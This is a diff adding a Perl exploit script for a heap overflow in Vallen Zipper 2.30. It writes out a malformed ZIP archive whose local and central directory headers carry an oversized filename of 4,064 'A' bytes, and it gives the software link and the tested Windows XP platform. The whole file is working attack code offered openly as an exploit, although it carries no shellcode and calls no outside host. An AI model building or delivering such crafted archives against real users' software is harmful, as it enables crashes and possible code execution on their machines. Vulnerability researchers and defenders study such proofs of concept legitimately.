@@ -1,0 +1,55 @@
+#!/usr/bin/perl
+#
+#
+#[+]Exploit Title: Vallen Zipper V2.30 .ZIP File Heap Overflow
+#[+]Date: 11\04\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://www.vallen.de/freeware/vzsetup.exe
+#[+]Version: 2.30
+#[+]Tested On: WIN-XP SP3 Brazil Portuguese
+#[+]CVE: N/A
+#
+#
+#
+
+use strict;
+use warnings;
+
+my $filename = "Exploit.zip"; 
+
+print "\n\n\t\tVallen Zipper 2.30 .ZIP File Heap Overflow\n";
+print "\t\tCreated by C4SS!0 G0M3S\n";
+print "\t\tE-mail Louredo_\@hotmail.com\n";
+print "\t\tSite www.exploit-br.org/\n\n";
+
+print "\n\n[+] Creting ZIP File...\n";
+sleep(1);
+my $head = "\x50\x4B\x03\x04\x14\x00\x00".
+"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\x00\x00" .
+"\xe4\x0f" .
+"\x00\x00\x00";
+
+my $head2 = "\x50\x4B\x01\x02\x14\x00\x14".
+"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
+"\xe4\x0f".
+"\x00\x00\x00\x00\x00\x00\x01\x00".
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+
+my $head3 = "\x50\x4B\x05\x06\x00\x00\x00".
+"\x00\x01\x00\x01\x00".
+"\x12\x10\x00\x00".
+"\x02\x10\x00\x00".
+"\x00\x00";
+
+my $payload = "\x41" x 4064;
+
+$payload = $payload.".txt";
+
+my $zip = $head.$payload.$head2.$payload.$head3;
+open(FILE,">$filename") || die "[-]Error:\n$!\n";
+print FILE $zip;
+close(FILE);
+print "[+] ZIP File Created With Sucess:)\n";
+sleep(3);
